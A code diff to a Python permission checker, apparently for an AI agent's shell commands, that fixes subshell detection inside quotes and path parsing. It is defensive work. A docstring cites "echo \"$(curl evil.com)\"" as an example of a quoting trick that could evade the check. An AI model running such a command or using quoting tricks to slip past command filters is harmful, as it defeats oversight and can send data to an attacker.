@@ -64,30 +64,77 @@ def _extract_dollar_subshells(command: str) -> list[str]:
     """Extract all $() subshell contents using balanced parenthesis counting.
 
     This properly handles nested subshells like $(echo $(ls)) by counting
-    parentheses to find matching pairs. Returns a list of inner command strings.
+    parentheses to find matching pairs.
+
+    Quoting rules (POSIX):
+    - Single-quoted strings (``'...'``) suppress ALL expansion — ``$(...)``
+      inside single quotes is never executed, so we skip over them entirely.
+    - Double-quoted strings (``"..."``) still allow subshell expansion, so
+      we must continue scanning through them for ``$(`` — skipping them would
+      create a security bypass (e.g. ``echo "$(curl evil.com)"`` would evade
+      detection if we skipped the double-quoted region).
+
+    Returns a list of inner command strings.
     """
     results: list[str] = []
     i = 0
-    while i < len(command):
+    length = len(command)
+
+    while i < length:
+        ch = command[i]
+
+        if ch == "\\" and i + 1 < length:
+            # Escaped character — skip both the backslash and the next char.
+            i += 2
+            continue
+
+        # Only skip SINGLE-quoted strings: inside '...' no expansion occurs.
+        # Do NOT skip double-quoted strings — $(...) is still expanded inside "...".
+        if ch == "'":
+            i += 1
+            while i < length and command[i] != "'":
+                i += 1
+            if i < length:
+                i += 1  # skip closing single-quote
+            continue
+
         # Look for $(
         if command[i : i + 2] == "$(":
             start = i + 2  # Position after "$("
             depth = 1
             j = start
-            # Count balanced parentheses to find the matching close
-            while j < len(command) and depth > 0:
-                if command[j] == "(":
+            # Count balanced parentheses, skipping quoted sections and escapes.
+            while j < length and depth > 0:
+                c = command[j]
+                if c == "\\" and j + 1 < length:
+                    j += 2
+                    continue
+                if c in ('"', "'"):
+                    q = c
+                    j += 1
+                    while j < length:
+                        ic = command[j]
+                        if ic == "\\" and q == '"' and j + 1 < length:
+                            j += 2
+                            continue
+                        if ic == q:
+                            j += 1
+                            break
+                        j += 1
+                    continue
+                if c == "(":
                     depth += 1
-                elif command[j] == ")":
+                elif c == ")":
                     depth -= 1
                 j += 1
             if depth == 0:
-                # Found matching close parenthesis
+                # Found matching close parenthesis.
                 inner = command[start : j - 1].strip()
                 if inner:
                     results.append(inner)
                 i = j  # Continue after the closing ')'
                 continue
+
         i += 1
     return results
 
@@ -371,6 +418,15 @@ class CapabilityPermissions:
         for token in arg_tokens:
             if token.startswith("-"):
                 continue  # skip option flags
+
+            # Skip tokens that are clearly not paths:
+            # - Pure numeric tokens (e.g. chmod mode "755")
+            # - Tokens like "user:group" (chown) that contain ':' but no path separators
+            if token.isdigit():
+                continue
+            if ":" in token and not any(c in token for c in ("/", "\\")):
+                continue
+
             try:
                 resolved = Path(token).expanduser().resolve()
             except Exception:
